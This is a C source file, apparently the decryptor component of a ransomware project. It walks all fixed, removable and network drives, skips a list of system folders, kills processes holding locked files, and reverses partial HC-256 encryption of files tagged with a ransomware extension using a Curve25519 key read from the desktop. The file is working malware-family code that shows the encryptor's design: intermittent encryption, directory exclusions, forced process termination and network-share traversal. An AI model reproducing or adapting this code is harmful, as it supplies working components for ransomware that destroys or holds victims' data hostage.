#include "decryptor.h"
#include <other/memory.h>
#include <other/settings.h>
#include <other/utility.h>
#include "curve25519.h"
#include "ecrypt-sync.h"
#include "sha512.h"
#include "crc32.h"
#include <stdio.h>

/* Directories that should not be encrypted. */
static const wchar_t* IGNORE_DIRECTORIES[] = { L".", L"..", L"$windows.~bt",
    L"intel", L"msocache", L"$recycle.bin", L"$windows.~ws", L"tor browser",
    L"boot", L"windows nt", L"msbuild", L"microsoft", L"all users",
    L"system volume information", L"perflog", L"google", L"application data",
    L"windows", L"windows.old", L"appdata", L"mozilla", L"microsoft.net",
    L"microsoft shared", L"internet explorer", L"common files", L"opera",
    L"windows journal", L"windows defender", L"windowsapp",
    L"windowspowershell", L"usoshared", L"windows security",
    L"windows photo viewer" };

static HANDLE g_hCompletionPort; /* Handle for the IO completion port. */
static HCRYPTPROV g_hCryptProv; /* Handle for the crypto service provider. */
static DWORD g_currentPID; /* Current PID. */
static BOOL g_finishedIterating = FALSE; /* True if finished iterating all drives. */
static BYTE g_privateKey[32]; /* Global private key to decrypt the data with. */

static DWORD WINAPI decryptionThread(LPVOID lpParam);
static DWORD WINAPI driveThread(LPVOID lpParam);
static void iterateDirectory(const wchar_t* path);
static inline void decryptFile(HANDLE hFile);
static inline BOOL parseKeys();

BOOL decryptDrives()
{
    // Initialize global variables
    g_currentPID = GetCurrentProcessId();
    if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
        !CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
        return FALSE;

    if (!parseKeys())
    {
        CryptReleaseContext(g_hCryptProv, 0);
        return FALSE;
    }

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD processorsCount = sysInfo.dwNumberOfProcessors;
    
    // Create a handle for the IO completion port
    g_hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, processorsCount);
    if (!g_hCompletionPort)
        return FALSE;

    // Create encryption threads
    HANDLE* decryptionThreads = (HANDLE*)smalloc(processorsCount, sizeof(HANDLE));
    for (DWORD i = 0; i < processorsCount; i++)
    {
        HANDLE hDecryptionThread = CreateThread(NULL, 0, decryptionThread, NULL, 0, NULL);
        if (!hDecryptionThread)
            return FALSE;
        
        // Run the current thread on a specific core
        DWORD_PTR mask = 1ULL << i;
        if (!SetThreadAffinityMask(hDecryptionThread, mask))
            return FALSE;

        decryptionThreads[i] = hDecryptionThread;
    }

    // Create iterator threads
    DWORD enumeratedDrives = 0, drivesBitmask = GetLogicalDrives();
    if (!drivesBitmask)
        goto cleanup;

    DWORD i = 0;
    HANDLE iteratorThreads[MAX_ITERATOR_THREADS];
    while (drivesBitmask)
    {
        if (drivesBitmask & 1)
        {
            const wchar_t driveLetter = L'A' + enumeratedDrives;
            HANDLE hIteratorThread = CreateThread(NULL, 0, driveThread, (LPVOID)driveLetter, 0, NULL);
            if (!hIteratorThread)
                return FALSE;

            iteratorThreads[i++] = hIteratorThread;
        }

        enumeratedDrives++;
        drivesBitmask >>= 1;
    }

    // Wait for all iterators to finish
    WaitForMultipleObjects(i, iteratorThreads, TRUE, INFINITE);
    g_finishedIterating = TRUE;
    for (DWORD j = 0; j < i; j++)
        CloseHandle(iteratorThreads[j]);

    // Wait for all encryptors to finish
    WaitForMultipleObjects(processorsCount, decryptionThreads, TRUE, INFINITE);
    for (DWORD j = 0; j < processorsCount; j++)
        CloseHandle(decryptionThreads[j]);

cleanup:
    sfree(decryptionThreads);
    CloseHandle(g_hCompletionPort);
    CryptReleaseContext(g_hCryptProv, 0);

    return TRUE;
}

BOOL parseKeys()
{
    wchar_t* filePath = getDesktopPath();
    if (!filePath)
        return NULL;
    lstrcatW(filePath, L"\\");
    lstrcatW(filePath, DEC_PK_FILE_NAME);
    
    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        sfree(filePath);
        return FALSE;
    }
    
    DWORD dwRead;
    if (!ReadFile(hFile, g_privateKey, sizeof(g_privateKey), &dwRead, NULL))
    {
        CloseHandle(hFile);
        sfree(filePath);

        return FALSE;
    }

    CloseHandle(hFile);
    DeleteFileW(filePath);
    
    sfree(filePath);
    return TRUE;
}

BOOL terminateFileProcesses(const wchar_t* filePath)
{
#ifdef DEBUG
    return FALSE;
#else
    DWORD dwSession;
    wchar_t sessionName[CCH_RM_SESSION_KEY + 1] = { 0 };
    if (RmStartSession(&dwSession, 0, sessionName) != ERROR_SUCCESS)
        return FALSE;

    LPCWSTR files[] = { filePath };
    if (RmRegisterResources(dwSession, 1, files, 0, NULL, 0, NULL) != ERROR_SUCCESS)
    {
        RmEndSession(dwSession);
        return FALSE;
    }

    UINT nProcInfoNeeded = 0, nProcInfo = 5;
    DWORD dwReason, err;
    RM_PROCESS_INFO* rgpi = (RM_PROCESS_INFO*)smalloc(nProcInfo, sizeof(RM_PROCESS_INFO));
    err = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);

    if (err == ERROR_MORE_DATA)
    {
        // nProcInfoNeeded contains the required memory size. free and retry
        sfree(rgpi);
        nProcInfo = nProcInfoNeeded;

        rgpi = (RM_PROCESS_INFO*)smalloc(nProcInfo, sizeof(RM_PROCESS_INFO));
        err = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);
    }

    if (err != ERROR_SUCCESS)
    {
        sfree(rgpi);
        RmEndSession(dwSession);

        return FALSE;
    }

    BOOL status = FALSE;
    RM_APP_TYPE appType;
    for (DWORD i = 0; i < nProcInfo; i++)
    {
        // Terminate processes that are not critical, explorer or us
        appType = rgpi[i].ApplicationType;
        if (appType == RmCritical || appType == RmExplorer || rgpi[i].Process.dwProcessId == g_currentPID)
            goto cleanup;

        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rgpi[i].Process.dwProcessId);
        if (!hProcess)
            goto cleanup;
        if (!TerminateProcess(hProcess, 0))
        {
            CloseHandle(hProcess);
            goto cleanup;
        }

        CloseHandle(hProcess);
    }

    status = TRUE;

cleanup:
    sfree(rgpi);
    RmEndSession(dwSession);

    return status;
#endif
}

DWORD WINAPI decryptionThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    static const DWORD DW_MILLISECONDS = 1 * 1000;
    
    wchar_t* filePath, * fileExtension;
    while (TRUE)
    {
        DWORD bytesRead;
        ULONG_PTR completionKey;
        LPOVERLAPPED pOverlapped;

        // Get the pending request, wait 1 second before stopping
        if (GetQueuedCompletionStatus(g_hCompletionPort, &bytesRead, &completionKey, &pOverlapped, DW_MILLISECONDS))
        {
            filePath = (wchar_t*)completionKey;
            fileExtension = CharLowerW(getExtension(filePath));
            
            // Skip the file if it hasn't been encrypted
            if (lstrcmpW(fileExtension, RANSOMWARE_EXTENSION) != 0)
                goto cleanup;
            
            wchar_t newPath[MAX_PATH];
            lstrcpyW(newPath, filePath);
            newPath[lstrlenW(filePath) - SIZE_OF_EXTENSION] = '\0';
            
            if (!MoveFileExW(filePath, newPath, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING))
                goto cleanup;
            
            HANDLE hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
            if (hFile == INVALID_HANDLE_VALUE)
            {
                if (GetLastError() != ERROR_SHARING_VIOLATION)
                    goto cleanup;

                // Try to close the processes that are using the file
                if (!terminateFileProcesses(newPath))
                    goto cleanup;

                // Successfully closed all processes that were using the file, retry opening it
                hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
                if (hFile == INVALID_HANDLE_VALUE)
                    goto cleanup;
            }
            
            decryptFile(hFile);
            CloseHandle(hFile);
            
        cleanup:
            sfree(filePath);
        }
        else if (GetLastError() == WAIT_TIMEOUT && g_finishedIterating)
            break;  // No more files
    }

    return 0;
}

DWORD WINAPI driveThread(LPVOID lpParam)
{
    wchar_t path[3] = { 0 };
    path[0] = (wchar_t)lpParam; path[1] = L':';

    DWORD driveType;
    if (driveType = GetDriveTypeW(path))
    {
        if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM)
        {
            printf("Decrypting drive %ls\n", path);
            iterateDirectory(path);
        }
        else if (driveType == DRIVE_REMOTE)
        {
            wchar_t buffer[MAX_PATH * 4];
            DWORD dwBufferLength = MAX_PATH * 4;
            UNIVERSAL_NAME_INFO* unameInfo = (UNIVERSAL_NAME_INFO*)&buffer;

            // Try to get the universal name
            if (WNetGetUniversalNameW(path, UNIVERSAL_NAME_INFO_LEVEL, unameInfo, &dwBufferLength) == NO_ERROR)
            {
                printf("Decrypting network drive %ls -> %ls\n", path, unameInfo->lpUniversalName);
                iterateDirectory(unameInfo->lpUniversalName);
            }
            else
            {
                // If failed to get the universal name, attempt to get the remote name
                dwBufferLength = MAX_PATH * 4;
                REMOTE_NAME_INFO* remInfo = (REMOTE_NAME_INFO*)&buffer;

                if (WNetGetUniversalNameW(path, REMOTE_NAME_INFO_LEVEL, remInfo, &dwBufferLength) == NO_ERROR)
                {
                    printf("Decrypting network drive %ls -> %ls\n", path, remInfo->lpUniversalName);
                    iterateDirectory(remInfo->lpUniversalName);
                }
                else
                    printf("Failed getting Universal or Remote name for network drive %ls\n", path);
            }
        }
    }
    else
        printf("Unknown drive %ls (%u)\n", path, driveType);

    return 0;
}

void iterateDirectory(const wchar_t* path)
{
    wchar_t newPath[MAX_PATH];
    wsprintfW(newPath, L"%ls\\*", path);
    size_t wlen = (size_t)lstrlenW(newPath) - 1;

    WIN32_FIND_DATAW fd;
    HANDLE hHandle = FindFirstFileW(newPath, &fd);
    if (hHandle == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            // Skip the directory if it's in the blacklisted directories
            if (valueInArray(CharLowerW(fd.cFileName), IGNORE_DIRECTORIES, _countof(IGNORE_DIRECTORIES)))
                continue;

            // Copy the filename on top the of asterisk to avoid copying twice
            lstrcpyW(newPath + wlen, fd.cFileName);
            iterateDirectory(newPath);
        }
        else if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM))
        {
            wchar_t* aPath = (wchar_t*)smalloc(MAX_PATH, sizeof(wchar_t));
            wsprintfW(aPath, L"%ls\\%ls", path, fd.cFileName);

            // If the file is readonly, mark it as writable
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
            {
                if (!SetFileAttributesW(aPath, FILE_ATTRIBUTE_NORMAL))
                {
                    sfree(aPath);
                    continue;
                }
            }

            // Send the path to the IO completion port to be received by the encryption threads
            if (!PostQueuedCompletionStatus(g_hCompletionPort, 0, (ULONG_PTR)aPath, NULL))
                sfree(aPath);
        }
    } while (FindNextFileW(hHandle, &fd));

    FindClose(hHandle);
}

void decryptFile(HANDLE hFile)
{
    LARGE_INTEGER fileSize, fileOffset, fileChunks;
    fileOffset.QuadPart = 0;
    if (!GetFileSizeEx(hFile, &fileSize))
        return;
    
    // If the file is smaller, no metadata exists
    if (fileSize.QuadPart < sizeof(FileMetadata_t))
        return;
    
    DWORD dwRead;
    DWORD dwWrite;
    BYTE sharedSecret[32];
    Keys_t keys;
    FileMetadata_t mt;
    
    // Read the metadata
    fileOffset.QuadPart = fileSize.QuadPart - sizeof(FileMetadata_t);
    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
    if (!ReadFile(hFile, &mt, sizeof(FileMetadata_t), &dwRead, 0))
        return;
    
    fileSize.QuadPart -= sizeof(FileMetadata_t);
    curve25519(sharedSecret, g_privateKey, mt.curve25519Public);
    SHA512_Simple(sharedSecret, sizeof(sharedSecret), &keys);
    if (mt.xcrc32Hash != xcrc32(&keys, sizeof(Keys_t)))
    {
        printf("Corrupted keys detected\n");
        return;
    }

    BYTE* buffer = (BYTE*)smalloc(READ_BLOCK_SIZE, sizeof(BYTE));
    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
    SetEndOfFile(hFile);    // Ignore the metadata
    
    // Setup the Key & IV for the decryption
    ECRYPT_ctx ctx;
    ECRYPT_keysetup(&ctx, keys.hc256Key, 256, 256);
    ECRYPT_ivsetup(&ctx, keys.hc256Vector);

    // Go back to the start of the file
    fileOffset.QuadPart = 0;
    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
    
    // Decrypt the file
    if (fileSize.QuadPart > LARGE_FILE_SIZE)
    {
        fileChunks.QuadPart = fileSize.QuadPart / 0xA00000i64;
        for (LONGLONG i = 0; i < fileChunks.QuadPart; i++)
        {
            if (!ReadFile(hFile, buffer, READ_BLOCK_SIZE, &dwRead, 0) || (dwRead != READ_BLOCK_SIZE))
            {
                printf("ReadFile failed\n");
                goto cleanup;
            }

            ECRYPT_process_bytes(0, &ctx, buffer, buffer, dwRead);
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
            WriteFile(hFile, buffer, READ_BLOCK_SIZE, &dwWrite, 0);

            fileOffset.QuadPart += 0xA00000i64;
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
        }
    }
    else if (fileSize.QuadPart > MEDIUM_FILE_SIZE)
    {
        LONGLONG jump = fileSize.QuadPart / 3;
        for (LONGLONG i = 0; i < 3; i++)
        {
            if (!ReadFile(hFile, buffer, READ_BLOCK_SIZE, &dwRead, 0) || (dwRead != READ_BLOCK_SIZE))
            {
                printf("ReadFile failed\n");
                goto cleanup;
            }

            ECRYPT_process_bytes(0, &ctx, buffer, buffer, dwRead);
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
            WriteFile(hFile, buffer, dwRead, &dwWrite, 0);

            fileOffset.QuadPart += jump;
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
        }
    }
    else
    {
        LONGLONG blockSize = fileSize.QuadPart > 64 ? fileSize.QuadPart / 10 : fileSize.QuadPart;
        if (!ReadFile(hFile, buffer, blockSize, &dwRead, 0) || (dwRead != blockSize))
        {
            printf("ReadFile failed\n");
            goto cleanup;
        }

        ECRYPT_process_bytes(0, &ctx, buffer, buffer, dwRead);
        SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
        WriteFile(hFile, buffer, dwRead, &dwWrite, 0);
    }
    
cleanup:
    sfree(buffer);
}